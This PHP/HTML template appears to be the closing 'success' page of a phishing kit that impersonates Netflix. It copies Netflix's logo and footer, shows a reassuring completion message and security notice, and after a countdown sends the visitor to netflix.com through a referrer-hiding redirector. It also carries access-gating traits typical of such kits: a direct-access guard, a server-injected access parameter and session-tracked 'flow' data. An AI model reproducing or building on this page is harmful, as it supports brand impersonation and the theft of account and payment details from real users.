<?php
defined("ALLOW") or exit('No direct script access allowed');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="i18n-done-title"></title>
    <link rel="icon" type="image/x-icon" href="/assets/images/nficon2023.ico">
    <link rel="stylesheet" href="/assets/styles/style.css">
    <style>
        /* Clean Loading Screen */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            background: #ffffff;
            z-index: 999999;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .loading-content {
            text-align: center;
            padding: 40px;
        }
        .loading-spinner {
            border: 3px solid #f0f0f0;
            border-top: 3px solid #e50914;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 24px;
        }
        .loading-text {
            margin: 0;
            font-size: 18px;
            font-weight: 400;
            color: #333;
            letter-spacing: 0.5px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- Simple Loading Screen -->
    <div id="loading-overlay" class="loading-overlay">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <p class="loading-text" id="i18n-loading"></p>
        </div>
    </div>

    <!-- Header -->
    <header class="header">
        <div class="header-content">
            <svg class="netflix-logo" viewBox="0 0 111 30" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img">
                <g><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path></g>
            </svg>
            <a href="#" class="sign-out" id="i18n-signout"></a>
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <div class="success-container">
            <!-- Success Icon -->
            <div class="success-icon">
                <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <circle cx="12" cy="12" r="10"/>
                    <path d="m9 12 2 2 4-4"/>
                </svg>
            </div>

            <!-- Title -->
            <h1 class="success-title" id="i18n-done-heading"></h1>

            <!-- Message -->
            <div class="success-message">
                <p id="i18n-done-msg1"></p>
                <p id="i18n-done-msg2"></p>
            </div>
            <!-- Auto Redirect Notice -->
            <div class="redirect-notice">
                <p id="i18n-done-redirect">Redirecting to Netflix in <span id="countdown">5</span> seconds...</p>
            </div>

            <!-- Security Notice -->
            <div class="security-notice">
                <span id="i18n-done-security"></span> <a href="#" id="i18n-done-learn"></a> <span id="i18n-done-about"></span>.
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <div class="footer-content">
            <div class="footer-contact" id="i18n-footer-contact"></div>

            <div class="footer-links">
                <a href="#" id="i18n-footer-faq"></a>
                <a href="#" id="i18n-footer-help"></a>
                <a href="#" id="i18n-footer-terms"></a>
                <a href="#" id="i18n-footer-privacy"></a>
                <a href="#" id="i18n-footer-cookies"></a>
                <a href="#" id="i18n-footer-corporate"></a>
                <a href="#" id="i18n-footer-adchoices"></a>
            </div>

            <div class="language-selector" style="position: relative; display: inline-block; margin-top: 20px;">
                <svg class="language-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="LanguagesSmall" aria-hidden="true" style="position: absolute; left: 8px; top: 50%; transform: translateY(-50%); width: 16px; height: 16px; color: #737373; pointer-events: none; z-index: 1;">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M10.7668 5.33333L10.5038 5.99715L9.33974 8.9355L8.76866 10.377L7.33333 14H9.10751L9.83505 12.0326H13.4217L14.162 14H16L12.5665 5.33333H10.8278H10.7668ZM10.6186 9.93479L10.3839 10.5632H11.1036H12.8856L11.6348 7.2136L10.6186 9.93479ZM9.52722 4.84224C9.55393 4.77481 9.58574 4.71045 9.62211 4.64954H6.41909V2H4.926V4.64954H0.540802V5.99715H4.31466C3.35062 7.79015 1.75173 9.51463 0 10.4283C0.329184 10.7138 0.811203 11.2391 1.04633 11.5931C2.55118 10.6795 3.90318 9.22912 4.926 7.57316V12.6667H6.41909V7.51606C6.81951 8.15256 7.26748 8.76169 7.7521 9.32292L8.31996 7.88955C7.80191 7.29052 7.34631 6.64699 6.9834 5.99715H9.06968L9.52722 4.84224Z" fill="currentColor"></path>
                </svg>
                <select name="language" id="language" style="background: transparent; border: 1px solid #737373; color: #737373; padding: 8px 32px 8px 32px; font-size: 13px; border-radius: 2px; appearance: none; cursor: pointer; min-width: 120px;">
                    <option value="en">English</option>
                    <option value="es">Español</option>
                </select>
                <svg class="dropdown-arrow" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); width: 12px; height: 12px; color: #737373; pointer-events: none; z-index: 1;">
                    <path d="M8 10.586L3.414 6 2 7.414 8 13.414 14 7.414 12.586 6z" fill="currentColor"/>
                </svg>
            </div>
            
            <div class="footer-country" id="i18n-footer-country">
            </div>
        </div>
    </footer>

    <script>
        // Simple Loading Screen - Hide after 1.5 seconds
        setTimeout(function() {
            const loadingOverlay = document.getElementById('loading-overlay');
            if (loadingOverlay) {
                loadingOverlay.style.opacity = '0';
                loadingOverlay.style.transition = 'opacity 0.3s ease';
                setTimeout(function() {
                    loadingOverlay.remove();
                }, 300);
            }
        }, 1500);

        // Auto redirect countdown
        let countdown = 5;
        const countdownElement = document.getElementById('countdown');
        
        function updateCountdown() {
            countdownElement.textContent = countdown;
            countdown--;
            
            if (countdown < 0) {
                // Redirect to Netflix homepage
                window.location.href = 'https://href.li/?https://netflix.com';
            } else {
                setTimeout(updateCountdown, 1000);
            }
        }
        
        // Start countdown after loading screen is hidden
        setTimeout(function() {
            updateCountdown();
        }, 2000);
        
        // Function to restart flow
        function restartFlow() {
            sessionStorage.removeItem('flowData');
            // Get access parameter from config (injected by server)
            const accessParam = window.__ACCESS_PARAM__ || 'access';
            window.location.href = '/?' + accessParam;
        }
    </script>
    <script>
      (function(){
        const L = window.__LANG__ || {};
        const set = (id, key) => { 
            const el = document.getElementById(id); 
            if (el && L[key]) {
                // Special handling for title tag
                if (el.tagName === 'TITLE' || id.includes('title')) {
                    el.textContent = L[key];
                    document.title = L[key];
                } else {
                    el.textContent = L[key];
                }
            }
        };
        set('i18n-done-title', 'done.title');
        set('i18n-done-heading', 'done.heading');
        set('i18n-done-msg1', 'done.success_msg1');
        set('i18n-done-msg2', 'done.success_msg2');
        set('i18n-done-security', 'done.security_notice');
        set('i18n-done-learn', 'done.learn_more');
        set('i18n-done-about', 'done.about');
        set('i18n-signout', 'header.signout');
        set('i18n-footer-country', 'footer.country');
        set('i18n-loading', 'common.loading');
        set('i18n-footer-contact', 'footer.questions');
        set('i18n-footer-faq', 'footer.faq');
        set('i18n-footer-help', 'footer.help');
        set('i18n-footer-terms', 'footer.terms');
        set('i18n-footer-privacy', 'footer.privacy');
        set('i18n-footer-cookies', 'footer.cookies');
        set('i18n-footer-corporate', 'footer.corporate');
        set('i18n-footer-adchoices', 'footer.adchoices');
        // Handle redirect text with countdown
        const redirectEl = document.getElementById('i18n-done-redirect');
        if (redirectEl && L['done.redirect']) {
          const template = L['done.redirect'];
          redirectEl.innerHTML = template.replace('{seconds}', '<span id="countdown">5</span>');
        }
      })();
    </script>
</body>
</html> 